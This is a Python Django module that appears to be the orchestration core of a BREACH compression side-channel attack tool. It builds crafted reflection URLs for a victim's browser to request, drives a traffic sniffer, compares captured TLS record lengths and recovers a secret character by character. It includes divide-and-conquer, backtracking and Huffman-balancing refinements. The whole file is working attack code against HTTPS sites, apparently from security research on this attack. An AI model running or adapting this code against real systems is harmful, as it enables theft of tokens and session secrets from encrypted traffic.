from django.utils import timezone
from django.db.models import Max
from django.core.exceptions import ValidationError

from breach.analyzer import decide_next_world_state
from breach.backtracking_analyzer import decide_next_backtracking_world_state
from breach.models import Target, Round, SampleSet
from breach.sniffer import Sniffer

import string
import requests
import logging
import random


logger = logging.getLogger(__name__)

CALIBRATION_STEP = 0.1
CALIBRATION_SAMPLESET_WINDOW_CHECK = 3


class MaxReflectionLengthError(Exception):
    '''Custom exception to handle cases when maxreflectionlength
    is not sufficient for the attack to continue.'''
    pass


class Strategy(object):
    def __init__(self, victim):
        self._victim = victim

        sniffer_params = {
            'snifferendpoint': self._victim.snifferendpoint,
            'sourceip': self._victim.sourceip,
            'host': self._victim.target.host,
            'interface': self._victim.interface,
            'port': self._victim.target.port,
            'calibration_wait': self._victim.calibration_wait
        }
        self.sniffer = Sniffer(sniffer_params)

        # Extract maximum round index for the current victim.
        current_round_index = Round.objects.filter(victim=self._victim).aggregate(Max('index'))['index__max']

        if not current_round_index:
            current_round_index = 1
            self._analyzed = True
            try:
                self._begin_attack()
            except MaxReflectionLengthError:
                # If the initial round or samplesets cannot be created, end the analysis
                return

        self._choose_next_round(self._victim.target.method, current_round_index)

        self._analyzed = False

    def _choose_next_round(self, method, current_round_index):
        # Choose next round to analyze, based on the execution method.
        if method == Target.BACKTRACKING:
            candidate_rounds = Round.objects.filter(
                victim=self._victim,
                completed=None
            ).order_by('-accumulated_probability')
            self._round = candidate_rounds[0]

            self._round.started = timezone.now()
            self._round.save()
        else:
            self._round = Round.objects.filter(
                victim=self._victim,
                index=current_round_index
            )[0]

    def get_decrypted_secret(self):
        return self._round.knownsecret

    def get_backtracking_scoreboard(self):
        candidate_rounds = Round.objects.filter(completed=None).order_by('-accumulated_probability')
        return [{'knownsecret': i.knownsecret, 'accumulated_probability': i.accumulated_probability} for i in candidate_rounds]

    def _build_candidates_divide_conquer(self, state):
        candidate_alphabet_cardinality = len(state['knownalphabet']) / 2

        bottom_half = state['knownalphabet'][:candidate_alphabet_cardinality]
        top_half = state['knownalphabet'][candidate_alphabet_cardinality:]

        return [bottom_half, top_half]

    def _build_candidates_serial(self, state):
        return state['knownalphabet']

    def _build_candidates(self, state):
        '''Given a state of the world, produce a list of candidate alphabets.'''
        methods = {
            Target.SERIAL: self._build_candidates_serial,
            Target.DIVIDE_CONQUER: self._build_candidates_divide_conquer,
            Target.BACKTRACKING: self._build_candidates_serial
        }
        return methods[self._round.get_method()](state)

    def _get_first_round_state(self):
        return {
            'knownsecret': self._victim.target.prefix,
            'candidatealphabet': self._victim.target.alphabet,
            'knownalphabet': self._victim.target.alphabet,
            'probability': 1.0
        }

    def _get_unstarted_samplesets(self):
        return SampleSet.objects.filter(
            round=self._round,
            started=None
        )

    def _reflection(self, alphabet):
        # We use sentinel as a separator symbol and we assume it is not part of the
        # secret. We also assume it will not be in the content.

        # Added symbols are the total amount of dummy symbols that need to be added,
        # either in candidate alphabet or huffman complement set in order
        # to avoid huffman tree imbalance between samplesets of the same batch.

        added_symbols = self._round.maxroundcardinality - self._round.minroundcardinality

        sentinel = self._victim.target.sentinel

        assert(sentinel not in self._round.knownalphabet)
        knownalphabet_complement = list(set(string.ascii_letters + string.digits) - set(self._round.knownalphabet))

        candidate_secrets = set()
        for letter in alphabet:
            candidate_secret = self._round.knownsecret + letter
            candidate_secrets.add(candidate_secret)

        # Candidate balance indicates the amount of dummy symbols that will be included with the
        # candidate alphabet's part of the reflection.
        candidate_balance = self._round.maxroundcardinality - len(candidate_secrets)
        assert(len(knownalphabet_complement) > candidate_balance)
        candidate_balance = [self._round.knownsecret + c for c in knownalphabet_complement[0:candidate_balance]]

        reflected_data = [
            '',
            sentinel.join(list(candidate_secrets) + candidate_balance),
            ''
        ]

        if self._round.huffman_pool:
            # Huffman complement indicates the knownalphabet symbols that are not currently being tested
            huffman_complement = set(self._round.knownalphabet) - set(alphabet)

            huffman_balance = added_symbols - len(candidate_balance)

            assert(len(knownalphabet_complement) > len(candidate_balance) + huffman_balance)

            huffman_balance = knownalphabet_complement[len(candidate_balance):huffman_balance]
            reflected_data.insert(1, sentinel.join(list(huffman_complement) + huffman_balance))

        reflection = sentinel.join(reflected_data)

        return reflection

    def _url(self, alphabet):
        return self._victim.target.endpoint % self._reflection(alphabet)

    def _sampleset_to_work(self, sampleset):
        return {
            'url': self._url(sampleset.candidatealphabet) + sampleset.huffman_match_balance,
            'amount': self._victim.target.samplesize,
            'alignmentalphabet': sampleset.alignmentalphabet,
            'timeout': 0
        }

    def get_work(self):
        '''Produces work for the victim.

        Pre-condition: There is already work to do.'''

        # If analysis is complete or maxreflectionlength cannot be overcome
        # then execution should abort
        if self._analyzed:
            logger.debug('Aborting get_work because analysis is completed')
            return {}

        # Reaps a hanging sampleset that may exist from previous framework execution
        # Hanging sampleset condition: backend or realtime crash
        hanging_samplesets = self._get_started_samplesets()
        for s in hanging_samplesets:
            logger.warning('Reaping hanging set for: {}'.format(s.candidatealphabet))
            self._mark_current_work_completed(sampleset=s)

        try:
            self.sniffer.start()
        except (requests.HTTPError, requests.exceptions.ConnectionError), err:
            if isinstance(err, requests.HTTPError):
                status_code = err.response.status_code
                logger.warning('Caught {} while trying to start sniffer.'.format(status_code))

                # If status was raised due to conflict,
                # delete already existing sniffer.
                if status_code == 409:
                    try:
                        self.sniffer.delete()
                    except (requests.HTTPError, requests.exceptions.ConnectionError), err:
                        logger.warning('Caught error when trying to delete sniffer: {}'.format(err))

            elif isinstance(err, requests.exceptions.ConnectionError):
                logger.warning('Caught ConnectionError')

            # An error occurred, so if there is a started sampleset mark it as failed
            if SampleSet.objects.filter(round=self._round, completed=None).exclude(started=None):
                self._mark_current_work_completed()

            return {}

        unstarted_samplesets = self._get_unstarted_samplesets()

        logger.debug('Found %i unstarted samplesets', len(unstarted_samplesets))

        assert(unstarted_samplesets)

        sampleset = unstarted_samplesets[0]
        sampleset.started = timezone.now()
        sampleset.save()

        work = self._sampleset_to_work(sampleset)

        logger.debug('Giving work:')
        logger.debug('\tCandidate: {}'.format(sampleset.candidatealphabet))
        logger.debug('\tKnown secret: {}'.format(sampleset.round.knownsecret))
        logger.debug('\tKnown alphabet: {}'.format(sampleset.round.knownalphabet))
        logger.debug('\tAlignment alphabet: {}'.format(sampleset.alignmentalphabet))
        logger.debug('\tAmount: {}'.format(sampleset.round.amount))

        return work

    def _get_started_samplesets(self):
        return SampleSet.objects.filter(
            round=self._round,
            completed=None
        ).exclude(started=None)

    def _get_current_sampleset(self):
        started_samplesets = self._get_started_samplesets()

        assert(len(started_samplesets) == 1)

        sampleset = started_samplesets[0]

        return sampleset

    def _handle_sampleset_success(self, capture, sampleset):
        '''Save capture of successful sampleset
        or mark sampleset as failed and create new sampleset for the same element that failed.'''
        if capture:
            sampleset.success = True
            sampleset.datalength = len(capture['data'])
            sampleset.records = capture['records']
            sampleset.save()
        else:
            SampleSet.create_sampleset({
                'round': self._round,
                'candidatealphabet': sampleset.candidatealphabet,
                'alignmentalphabet': sampleset.alignmentalphabet,
                'batch': sampleset.batch
            })

    def _mark_current_work_completed(self, capture=None, sampleset=None):
        if not sampleset:
            sampleset = self._get_current_sampleset()

        logger.debug('Marking sampleset as completed:')
        logger.debug('\tcandidatealphabet: %s', sampleset.candidatealphabet)
        logger.debug('\troundknownalphabet: %s', sampleset.round.knownalphabet)

        sampleset.completed = timezone.now()
        sampleset.save()

        self._handle_sampleset_success(capture, sampleset)

    def _collect_capture(self):
        return self.sniffer.read()

    def _analyze_current_round(self):
        '''Analyzes the current round samplesets to extract a decision.'''

        current_round_samplesets = SampleSet.objects.filter(round=self._round, success=True)

        if self._round.get_method() == Target.BACKTRACKING:
            self._decision = decide_next_backtracking_world_state(
                current_round_samplesets,
                self._round.accumulated_probability
            )
        else:
            self._decision = decide_next_world_state(current_round_samplesets)

        self._analyzed = True

    def _round_is_completed(self):
        '''Checks if current round is completed.'''

        assert(self._analyzed)

        # Do we need to collect more samplesets to build up confidence?
        if self._round.get_method() != Target.BACKTRACKING:
            return self._decision['confidence'] > self._victim.target.confidence_threshold
        else:
            # If backtracking is enabled we don't have to build extra confidence.
            return True

    def _create_next_round(self):
        assert(self._round_is_completed())

        self._create_round(self._decision['state'])

    def _create_new_rounds(self):
        assert(self._round_is_completed())

        # Create round for every optimal candidate.
        for candidate in self._decision:
            self._create_round(candidate)
            self._create_round_samplesets()

    def _set_round_cardinalities(self, candidate_alphabets):
        self._round.maxroundcardinality = max(map(len, candidate_alphabets))
        self._round.minroundcardinality = min(map(len, candidate_alphabets))

    def _adapt_reflection_length(self, state):
        '''Check reflection length compared to maxreflectionlength.

        If current reflection length is bigger, downgrade various attack aspects
        until reflection length <= maxreflectionlength.

        If all downgrade attempts fail, raise a MaxReflectionLengthError.

        Condition: Reflection returns strings of same length for all candidates in
        candidate alphabet.'''
        def _build_candidate_alphabets():
            candidate_alphabets = self._build_candidates(state)
            self._set_round_cardinalities(candidate_alphabets)
            return candidate_alphabets

        def _get_first_reflection():
            alphabet = _build_candidate_alphabets()[0]
            ref = self._reflection(alphabet)
            if self._round.huffman_balance:
                ref += self._get_huffman_balance()
            return ref

        if self._round.victim.target.maxreflectionlength == 0:
            self._set_round_cardinalities(self._build_candidates(state))
            return

        while len(_get_first_reflection()) > self._round.victim.target.maxreflectionlength:
            if self._round.huffman_balance:
                self._round.huffman_balance = False
                self._round.save()
                logger.info('Huffman balance cannot be used, removing it.')
            elif self._round.method == Target.DIVIDE_CONQUER:
                self._round.method = Target.SERIAL
                self._round.save()
                logger.info('Divide & conquer method cannot be used, falling back to serial.')
            elif self._round.huffman_pool:
                self._round.huffman_pool = False
                self._round.save()
                logger.info('Huffman pool cannot be used, removing it.')
            else:
                raise MaxReflectionLengthError('Cannot attack, specified maxreflectionlength is too short')

    def _create_round(self, state):
        '''Creates a new round based on the analysis of the current round.'''

        assert(self._analyzed)

        # If backtracking is enabled, we need to pass the accumulated
        # probability of the given candidate. Else we pass the default value.
        #
        # Next round index is calculated by incrementing current round index.
        # However backtracking does not always analyzes the round with maximum
        # index so each time we need to extract that value for the rounds to
        # come.
        prob = 1.0
        max_index = self._round.index + 1 if hasattr(self, '_round') else 1
        if self._victim.target.method == Target.BACKTRACKING:
            prob = state['probability']
            if max_index != 1:
                max_index = Round.objects.filter(victim=self._victim).aggregate(Max('index'))['index__max'] + 1

        # This next round could potentially be the final round.
        # A final round has the complete secret stored in knownsecret.
        next_round = Round(
            victim=self._victim,
            index=max_index,
            amount=self._victim.target.samplesize,
            knownalphabet=state['knownalphabet'],
            knownsecret=state['knownsecret'],
            accumulated_probability=prob,
            huffman_pool=self._victim.target.huffman_pool,
            block_align=self._victim.target.block_align,
            huffman_balance=self._victim.target.huffman_balance,
            method=self._victim.target.method
        )
        next_round.save()
        self._round = next_round

        try:
            self._adapt_reflection_length(state)
        except MaxReflectionLengthError, err:
            self._round.delete()
            self._analyzed = True
            logger.info(err)
            raise err

        try:
            next_round.clean()
        except ValidationError, err:
            logger.error(err)
            self._round.delete()
            raise err

    def _get_huffman_balance(self):
        # The LZ77 algorithm runs first and the Huffman tree is produced afterwards.
        # When the LZ77 algorithm runs, it creates "match" symbols encoding the length
        # of the matching portion of the text, e.g., if the matching size is 5, the symbol
        # encoded will be a "match 5". When the secret compresses well due to LZ77, the
        # symbol encoded in the Huffman tree will be a match equal to the known secret text
        # length plus one; when it does not compress well, it will be a match equal to
        # only the known secret length. The changing frequencies of the match symbols
        # occurrences can cause a snowball effect on the Huffman tree if their frequencies
        # are close to the frequencies of other symbols (such as literals). Here, we artificially
        # create more occurences of the "match 5" and "match 6" LZ77 symbols (for a known
        # secret of e.g. size 5) such that we can separate them distinctly within the Huffman
        # tree.

        balance1 = ''
        balance2 = ''
        for i in range(len(self._round.knownsecret) + 1):
            balance1 += random.choice(string.ascii_lowercase + string.ascii_uppercase)
            balance2 += random.choice(string.ascii_lowercase + string.ascii_uppercase)
        balance1 = balance1[:-1]
        return ''.join([balance2 + balance1 + chr(ord('A') + i) for i in range(random.randrange(ord('Z') - ord('A')))])

    def _create_round_samplesets(self):
        state = {
            'knownalphabet': self._round.knownalphabet,
            'knownsecret': self._round.knownsecret
        }

        self._round.batch += 1
        self._round.save()

        candidate_alphabets = self._build_candidates(state)

        huffman_match_balance = ''
        if self._round.huffman_balance:
            huffman_match_balance = self._get_huffman_balance()

        alignmentalphabet = ''
        if self._round.block_align:
            alignmentalphabet = list(self._round.victim.target.alignmentalphabet)
            random.shuffle(alignmentalphabet)
            alignmentalphabet = ''.join(alignmentalphabet)

        for candidate in candidate_alphabets:
            SampleSet.create_sampleset({
                'round': self._round,
                'candidatealphabet': candidate,
                'alignmentalphabet': alignmentalphabet,
                'huffman_match_balance': huffman_match_balance,
                'batch': self._round.batch
            })

    def _attack_is_completed(self):
        return len(self._round.knownsecret) == self._victim.target.secretlength

    def _check_branch_length(self):
        return self._round.knownsecret == self._victim.target.secretlength

    def _need_for_calibration(self):
        started_samplesets = SampleSet.objects.filter(round=self._round).exclude(started=None)
        minimum_samplesets = len(started_samplesets) >= CALIBRATION_SAMPLESET_WINDOW_CHECK
        calibration_samplesets = SampleSet.objects.filter(round=self._round).order_by('-completed')[0:CALIBRATION_SAMPLESET_WINDOW_CHECK]
        consecutive_failed_samplesets = all([not sampleset.success for sampleset in calibration_samplesets])
        return minimum_samplesets and consecutive_failed_samplesets

    def _need_for_cardinality_update(self):
        calibration_samplesets = SampleSet.objects.filter(round=self._round).order_by('-completed')[0:CALIBRATION_SAMPLESET_WINDOW_CHECK]
        consecutive_new_cardinality_samplesets = all(
            [sampleset.records % sampleset.round.victim.target.samplesize == 0 for sampleset in calibration_samplesets]
        )
        return self._need_for_calibration() and consecutive_new_cardinality_samplesets

    def _flush_batch_samplesets(self):
        '''Mark all successful samplesets of current round's batch as failed
        and create replacements.'''
        current_batch_samplesets = SampleSet.objects.filter(round=self._round, batch=self._round.batch, success=True).exclude(started=None)
        for sampleset in current_batch_samplesets:
            self._mark_current_work_completed(sampleset=sampleset)

    def work_completed(self, success=True):
        '''Receives and consumes work completed from the victim, analyzes
        the work, and returns True if the attack is complete (victory),
        otherwise returns False if more work is needed.

        It also creates the new work that is needed.

        Post-condition: Either the attack is completed, or there is work to
        do (there are unstarted samplesets in the database).'''
        try:
            if success:
                # Call sniffer to get captured data
                capture = self._collect_capture()
                logger.debug('Work completed:')
                logger.debug('\tLength: {}'.format(len(capture['data'])))
                logger.debug('\tRecords: {}'.format(capture['records']))

                # Check if all TLS response records were captured,
                # if available
                if self._victim.recordscardinality:
                    expected_records = self._victim.target.samplesize * self._victim.recordscardinality
                    if capture['records'] != expected_records:
                        if capture['records'] == 0 or capture['records'] % self._victim.target.samplesize:
                            logger.debug('Records not multiple of samplesize. Checking need for calibration...')
                            if self._need_for_calibration():
                                self._victim.calibration_wait += CALIBRATION_STEP
                                self._victim.save()
                                logger.debug('Calibrating system. New calibration_wait time: {} seconds'.format(self._victim.calibration_wait))
                        else:
                            logger.debug('Records multiple of samplesize but with different cardinality.')
                            if self._need_for_cardinality_update():
                                self._victim.recordscardinality = int(capture['records'] / self._victim.target.samplesize)
                                self._victim.save()
                                self._victim.target.recordscardinality = int(capture['records'] / self._victim.target.samplesize)
                                self._victim.target.save()
                                self._flush_batch_samplesets()
                                logger.debug("Updating records' cardinality. New cardinality: {}".format(self._victim.recordscardinality))

                        raise ValueError('Not all records captured')
            else:
                logger.debug('Client returned fail to realtime')
                raise ValueError('Realtime reported unsuccessful capture')

            # Stop data collection and delete sniffer
            self.sniffer.delete()
        except (requests.HTTPError, requests.exceptions.ConnectionError, ValueError), err:
            if isinstance(err, requests.HTTPError):
                status_code = err.response.status_code
                logger.warning('Caught {} while trying to collect capture and delete sniffer.'.format(status_code))

                # If status was raised due to malformed capture,
                # delete sniffer to avoid conflict.
                if status_code == 422:
                    try:
                        self.sniffer.delete()
                    except (requests.HTTPError, requests.exceptions.ConnectionError), err:
                        logger.warning('Caught error when trying to delete sniffer: {}'.format(err))

            elif isinstance(err, requests.exceptions.ConnectionError):
                logger.warning('Caught ConnectionError')

            elif isinstance(err, ValueError):
                logger.warning(err)
                try:
                    self.sniffer.delete()
                except (requests.HTTPError, requests.exceptions.ConnectionError), err:
                    logger.warning('Caught error when trying to delete sniffer: {}'.format(err))

            # An error occurred, so if there is a started sampleset mark it as failed
            if SampleSet.objects.filter(round=self._round, completed=None).exclude(started=None):
                self._mark_current_work_completed()

            return False

        self._mark_current_work_completed(capture)

        round_samplesets = SampleSet.objects.filter(round=self._round)
        unstarted_samplesets = round_samplesets.filter(started=None)

        if unstarted_samplesets:
            # Batch is not yet complete, we need to collect more samplesets
            # that have already been created for this batch.
            return False

        # All batches are completed.
        self._analyze_current_round()

        # Serial and divide and conquer methods require a certain confidence to
        # complete current round, whereas backtracking only checks if final
        # secret is recovered.
        if self._victim.target.method == Target.BACKTRACKING:
            return self._complete_backtracking_round()
        else:
            return self._complete_round()

    def _complete_round(self):
        logger.info(75 * '$')
        logger.info('Decision:')
        for i in self._decision:
            logger.info('\t{}: {}'.format(i, self._decision[i]))
        logger.info(75 * '$')

        if self._round_is_completed():
            # Advance to the next round.
            try:
                self._create_next_round()
            except MaxReflectionLengthError:
                # If a new round cannot be created, end the attack
                return True

            if self._attack_is_completed():
                return True

        # Not enough confidence, we need to create more samplesets to be
        # collected for this round.
        self._create_round_samplesets()

        return False

    def _complete_backtracking_round(self):
        self._round.completed = timezone.now()
        self._round.save()

        if not self._check_branch_length():
            try:
                self._create_new_rounds()

                logger.info(75 * '$')
                logger.info('Optimal Candidates:')
                candidate_rounds = Round.objects.filter(completed=None).order_by('-accumulated_probability')
                for i in candidate_rounds:
                    logger.info('\tSecret: %s Probability: %.6f' % (i.knownsecret, i.accumulated_probability))
                logger.info(75 * '$')

                return False
            except MaxReflectionLengthError:
                # If a new round cannot be created, end the attack.
                return True

        logger.info(75 * '$')
        logger.info('Optimal Candidates:')
        for i in self.get_backtracking_scoreboard():
            logger.info('\tSecret: %s Probability: %.6f' % (i['knownsecret'], i['accumulated_probability']))
        logger.info(75 * '$')

        # If current branch is completed, then we already matched the
        # secretlength.
        return True

    def _begin_attack(self):
        self._create_round(self._get_first_round_state())
        self._create_round_samplesets()
